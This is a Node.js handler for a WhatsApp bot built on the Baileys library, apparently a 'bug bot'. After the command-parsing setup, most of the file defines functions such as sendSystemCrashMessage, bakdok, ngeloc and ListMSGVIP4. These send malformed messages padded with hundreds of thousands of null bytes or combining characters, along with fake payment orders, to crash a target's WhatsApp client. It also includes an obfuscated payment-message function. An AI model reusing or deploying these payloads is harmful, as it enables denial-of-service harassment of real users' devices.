
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')




module.exports = async (udmodz, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');


const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (udmodz.user.id.split(':')[0]+'@s.whatsapp.net' || udmodz.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await udmodz.decodeJid(udmodz.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await udmodz.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//====================================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ Someone ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await udmodz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

// respon list 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
udmodz.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
udmodz.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
const virgam = fs.readFileSync(`./lib/image/virgam.png`)
const latx = fs.readFileSync(`./image/latx.png`)
const anjay = fs.readFileSync(`./image/udmodz.png`)
const qris = fs.readFileSync(`./image/udmodz.png`)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};
// 𝘙𝘌𝘗𝘓𝘠
async function loading () {
var genalpa = [
"BOT",
"BUG",
"UDMODZ"
]
let { key } = await udmodz.sendMessage(m.chat, {text: 'SL UD TECHSHOW'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < genalpa.length; i++) {
await sleep(10)
await udmodz.sendMessage(m.chat, {text: genalpa[i], edit: key });
}
}

// FUNCTION BUG //

const zynbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `send bug 💸`
}
}
}

const zynxzobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/virgam.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Zʏɴxᴢᴏᴏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    qio.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "UDMODZ CRASH"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'b4u', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await udmodz.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": anjay
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"udmodz Crash",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const zpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `Msg ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍MODS CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗨𝗗𝗠𝗢𝗗𝗭 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

YOUTUBE.COM/@udmodz🗿
 𝗨𝗗𝗠𝗢𝗗𝗭╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`

}

]

}

}

}

}


async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `UDMODZ DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await udmodz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await udmodz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function iponcrash(target) {
await udmodz.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function ListMSGVIP3(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '𝖅𝖞𝖓𝖝𝖟𝖔𝖔',
                        },
                        body: {
                            text: '𝖃',
                        },
                        footer: {
                            text: '𝕮𝖗𝖆𝖘𝖍',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝖅𝖞𝖓𝖝𝖟𝖔', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝖃', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕮𝖗𝖆𝖘𝖍', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await udmodz.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ListMSGVIP4(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'Hemm',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'ppq',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await udmodz.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝖅𝖞𝖓𝖝𝖟𝖔𝖔 𝖃 𝕮𝖗𝖆𝖘𝖍𝖍`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await udmodz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function bugzynz(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {

  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗨𝗗𝗠𝗢𝗗𝗭 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》

_*██ 𝗨𝗗𝗠𝗢𝗗𝗭██*_ 

𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈

*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: kuwoted })

await udmodz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })

}
    
(function(_0x4a0c3c,_0x449ed6){var _0x104feb=_0x1bd9,_0x3e3dd0=_0x4a0c3c();while(!![]){try{var _0x481ad5=parseInt(_0x104feb(0x123))/0x1*(-parseInt(_0x104feb(0x12c))/0x2)+-parseInt(_0x104feb(0x12e))/0x3+-parseInt(_0x104feb(0x11f))/0x4+parseInt(_0x104feb(0x120))/0x5+parseInt(_0x104feb(0x11e))/0x6*(-parseInt(_0x104feb(0x126))/0x7)+-parseInt(_0x104feb(0x12f))/0x8+-parseInt(_0x104feb(0x125))/0x9*(-parseInt(_0x104feb(0x121))/0xa);if(_0x481ad5===_0x449ed6)break;else _0x3e3dd0['push'](_0x3e3dd0['shift']());}catch(_0x2c4bb4){_0x3e3dd0['push'](_0x3e3dd0['shift']());}}}(_0x5751,0x33690));function hi(){var _0x4ca531=_0x1bd9;console['log'](_0x4ca531(0x122));}function _0x5751(){var _0x5489b7=['10RyLaBj','Replying','10412BelDfW','meu\x20ovo','10276299zlszHl','42MFbSVh','physical-goods','payment_info','pix_static_code','pending','4P46GMY57GC','38zEAssq','+5533998586057','495336GBTdnV','1900344WdqeoS','ORDER','33228OrqiJL','1342808IxSDsY','190890kWQtXO'];_0x5751=function(){return _0x5489b7;};return _0x5751();}hi();function _0x1bd9(_0xdb0a9e,_0x35a4f6){var _0x5751dd=_0x5751();return _0x1bd9=function(_0x1bd910,_0x4c97e1){_0x1bd910=_0x1bd910-0x11e;var _0x5d47b4=_0x5751dd[_0x1bd910];return _0x5d47b4;},_0x1bd9(_0xdb0a9e,_0x35a4f6);}async function sendPaymentInfoMessage(_0x28ef97){var _0x404515=_0x1bd9;await udmodz['relayMessage'](_0x28ef97,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x404515(0x128),'buttonParamsJson':JSON['stringify']({'currency':'BRL','total_amount':{'value':0x0,'offset':0x64},'reference_id':_0x404515(0x12b),'type':_0x404515(0x127),'order':{'status':_0x404515(0x12a),'subtotal':{'value':0x0,'offset':0x64},'order_type':_0x404515(0x130),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':_0x404515(0x129),'pix_static_code':{'merchant_name':_0x404515(0x124),'key':_0x404515(0x12d),'key_type':'X'}}]})}]}}}}},{'participant':{'jid':_0x28ef97}},{'messageId':null});}

// BATA FUNCTION //
    
const zyn = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: anjay,
      itemCount: 999999999999999,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};
    
async function downloadMp3 (link) {
try {
